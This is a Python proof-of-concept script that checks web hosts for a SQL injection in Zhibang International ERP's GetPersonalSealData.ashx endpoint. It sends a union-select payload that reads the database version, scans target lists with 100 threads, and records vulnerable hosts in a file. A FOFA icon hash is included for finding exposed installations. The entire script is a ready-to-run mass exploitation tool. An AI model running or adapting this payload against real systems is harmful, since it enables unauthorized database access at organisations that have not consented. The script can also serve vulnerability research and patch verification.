import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """智邦国际ERP-GetPersonalSealData.ashx存在SQL注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='智邦国际ERP-GetPersonalSealData.ashx存在SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--"
    headers = {
        "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip,deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        response = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and "Image" in response.text:
            print(f"[+]{target}存在sql注入漏洞")
            with open('智邦国际_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在sql注入漏洞")
    except:
        print(f"[x]{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# icon_hash="-682445886"